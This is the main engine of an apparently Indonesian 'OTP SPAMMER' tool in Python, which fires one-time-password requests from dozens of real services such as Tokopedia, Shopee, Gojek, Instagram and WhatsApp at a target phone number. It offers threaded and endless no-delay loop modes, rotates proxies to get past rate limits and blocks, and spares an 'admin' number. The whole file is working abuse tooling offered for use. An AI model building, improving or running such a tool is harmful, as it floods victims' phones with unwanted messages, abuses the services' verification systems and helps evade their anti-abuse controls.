#!/usr/bin/env python3
# main_engine.py - 109 API (NO FILTER, NO DELAY)

import sys
import time
import random
import threading
import signal
import os
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

from license import log_info, log_success, log_warning, log_error, log_input, is_admin_number
from utils import normalize
from handlers import get_all_handlers
from proxy_manager import get_proxy_manager

init(autoreset=True)

print_lock = threading.Lock()
stop_flag = False

pm = get_proxy_manager()

# ==================== API YANG BENERAN KIRIM OTP ====================
REAL_OTP_APIS = [
    'tokopedia', 'shopee', 'gojek', 'jenius', 'blibli',
    'alodokter', 'halodoc', 'oyo', 'sayurbox', 'carsome',
    'pizzahut', 'matahari', 'olx', 'indihome', 'tiktok',
    'bonusbelanja', 'bliblitiket', 'ultramilk', 'watsons',
    '99co', 'fastwork', 'beautyhaul', 'hainaya', 'sidemang',
    'ptspkemenag', 'uber', 'doordash', 'instagram', 'whatsapp',
    'flipkart', 'paytm', 'zomato'
]

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))

def is_success_response(resp):
    if resp is None:
        return False
    
    if isinstance(resp, tuple):
        if len(resp) >= 2:
            if isinstance(resp[0], bool):
                return resp[0]
            if isinstance(resp[0], int):
                return resp[0] < 400
        return False
    
    if hasattr(resp, 'status_code'):
        return resp.status_code < 400
    
    if isinstance(resp, bool):
        return resp
    
    if isinstance(resp, dict):
        if resp.get('success') or resp.get('status') == 'success':
            return True
        if resp.get('acknowledge') == 1:
            return True
        return False
    
    return bool(resp)

def get_detail_from_response(resp):
    if resp is None:
        return "No response"
    
    if isinstance(resp, tuple):
        if len(resp) >= 3:
            return str(resp[2])[:60] if resp[2] else "OK"
        if len(resp) >= 2:
            return str(resp[1])[:60] if resp[1] else "OK"
        return "OK"
    
    if hasattr(resp, 'status_code'):
        if resp.status_code < 400:
            return "OTP sent"
        return f"({resp.status_code})"
    
    if isinstance(resp, dict):
        return str(resp.get('message', resp.get('status', 'OK')))[:60]
    
    return "OK"

def print_banner(proxy_count, real_otp_count, failed_count, use_proxy):
    status = "PROXY" if use_proxy else "DIRECT"
    color = Fore.GREEN if use_proxy else Fore.CYAN
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.WHITE}  OTP SPAMMER - 100 API+ {Fore.GREEN}{proxy_count}{Fore.WHITE} PROXY{Fore.CYAN}          ║
{Fore.CYAN}║{Style.DIM}  Real OTP: {Fore.GREEN}{real_otp_count}{Style.DIM} API | Mode: {color}{status}{Style.DIM}           {Fore.CYAN}║
{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

def run_handler(handler_name, handler_func, phone, idx, total, use_proxy):
    global stop_flag
    if stop_flag:
        return False
    
    name = handler_name
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        if use_proxy:
            proxy = pm.get_proxy()
            proxy_dict = pm.get_proxy_dict(proxy)
            if proxy_dict:
                os.environ['HTTP_PROXY'] = proxy_dict.get('http', '')
                os.environ['HTTPS_PROXY'] = proxy_dict.get('https', '')
        
        resp = handler_func(phone)
        
        os.environ.pop('HTTP_PROXY', None)
        os.environ.pop('HTTPS_PROXY', None)
        
        if resp is not None:
            if isinstance(resp, tuple):
                if len(resp) >= 2:
                    code = resp[0]
                    msg = resp[1] if len(resp) > 1 else ""
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent" if name in REAL_OTP_APIS else "HTTP OK"
                        success = True
                    elif code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                        if use_proxy: pm.mark_failed(proxy)
                    else:
                        detail = f"({code}) {str(msg)[:30] if msg else ''}"
                        if use_proxy: pm.mark_failed(proxy)
                else:
                    status_text = "SUCCESS" if resp[0] else "FAIL"
                    success = True if resp[0] else False
                    if not success and use_proxy: pm.mark_failed(proxy)
            elif hasattr(resp, 'status_code'):
                if resp.status_code < 400:
                    status_text = "SUCCESS"
                    detail = "OTP sent" if name in REAL_OTP_APIS else "HTTP OK"
                    success = True
                    if use_proxy: pm.mark_success(proxy)
                elif resp.status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                    if use_proxy: pm.mark_failed(proxy)
                elif resp.status_code == 403:
                    status_text = "BLOCKED"
                    detail = "Forbidden"
                    if use_proxy: pm.mark_failed(proxy)
                else:
                    detail = f"({resp.status_code})"
                    if use_proxy: pm.mark_failed(proxy)
            elif isinstance(resp, bool):
                status_text = "SUCCESS" if resp else "FAIL"
                success = resp
                if not success and use_proxy: pm.mark_failed(proxy)
            else:
                status_text = "SUCCESS" if resp else "FAIL"
                success = True if resp else False
                if not success and use_proxy: pm.mark_failed(proxy)
        else:
            status_text = "ERROR"
            detail = "No response"
            if use_proxy: pm.mark_failed(proxy)
            
    except Exception as e:
        status_text = "ERROR"
        detail = str(e)[:40]
        if use_proxy: pm.mark_failed(proxy)

    log_target(idx, total, name, status_text, detail)
    return success

def run_single_round(phone, threads=1, use_proxy=False):
    global stop_flag
    stop_flag = False
    
    if use_proxy:
        pm.load_proxies(force=True)
        pm.use_proxy = True
    else:
        pm.use_proxy = False
    
    stats = pm.get_stats()
    handlers = get_all_handlers()
    total = len(handlers)
    
    print_banner(
        proxy_count=stats.get('total', 0),
        real_otp_count=len(REAL_OTP_APIS),
        failed_count=stats.get('failed', 0),
        use_proxy=use_proxy
    )
    print()
    
    target62 = normalize(phone)
    if not target62:
        log_error("Format nomor tidak valid!")
        return False
    
    if is_admin_number(target62):
        log_error("Nomor ADMIN tidak boleh di-spam!")
        return False
    
    success_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            idx = 0
            for name, func in handlers.items():
                if stop_flag:
                    break
                idx += 1
                futures.append(executor.submit(run_handler, name, func, target62, idx, total, use_proxy))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan user!")
        log_info(f"Sukses: {success_count}/{total}")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total}")
    
    return success_count > 0

def run_infinite_loop(phone, use_proxy=False):
    global stop_flag
    stop_flag = False
    
    if use_proxy:
        pm.load_proxies(force=True)
        pm.use_proxy = True
    else:
        pm.use_proxy = False
    
    stats = pm.get_stats()
    handlers = get_all_handlers()
    total = len(handlers)
    
    print_banner(
        proxy_count=stats.get('total', 0),
        real_otp_count=len(REAL_OTP_APIS),
        failed_count=stats.get('failed', 0),
        use_proxy=use_proxy
    )
    print()
    
    target62 = normalize(phone)
    if not target62:
        log_error("Format nomor tidak valid!")
        return
    
    if is_admin_number(target62):
        log_error("Nomor ADMIN tidak boleh di-spam!")
        return
    
    total_success = 0
    total_fail = 0
    round_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            if stop_flag:
                break
            round_count += 1
            log_info(f"Round {round_count} dimulai...")
            success_count = 0
            
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = []
                idx = 0
                for name, func in handlers.items():
                    if stop_flag:
                        break
                    idx += 1
                    futures.append(executor.submit(run_handler, name, func, target62, idx, total, use_proxy))
                
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            
            if stop_flag:
                break
            
            log_info(f"Round {round_count} selesai. Sukses: {success_count}/{total}")
            log_info(f"Total: success={total_success} | fail={total_fail}")
            
            # TANPA DELAY - LANGSUNG LOOP LAGI
            
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan user!")
        log_info(f"Total success: {total_success} | fail: {total_fail}")

def run_custom_thread(phone, threads=5, use_proxy=False):
    global stop_flag
    stop_flag = False
    
    if use_proxy:
        pm.load_proxies(force=True)
        pm.use_proxy = True
    else:
        pm.use_proxy = False
    
    stats = pm.get_stats()
    handlers = get_all_handlers()
    total = len(handlers)
    
    print_banner(
        proxy_count=stats.get('total', 0),
        real_otp_count=len(REAL_OTP_APIS),
        failed_count=stats.get('failed', 0),
        use_proxy=use_proxy
    )
    print()
    
    target62 = normalize(phone)
    if not target62:
        log_error("Format nomor tidak valid!")
        return
    
    if is_admin_number(target62):
        log_error("Nomor ADMIN tidak boleh di-spam!")
        return
    
    success_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            idx = 0
            for name, func in handlers.items():
                if stop_flag:
                    break
                idx += 1
                futures.append(executor.submit(run_handler, name, func, target62, idx, total, use_proxy))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan user!")
        log_info(f"Sukses: {success_count}/{total}")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total}")
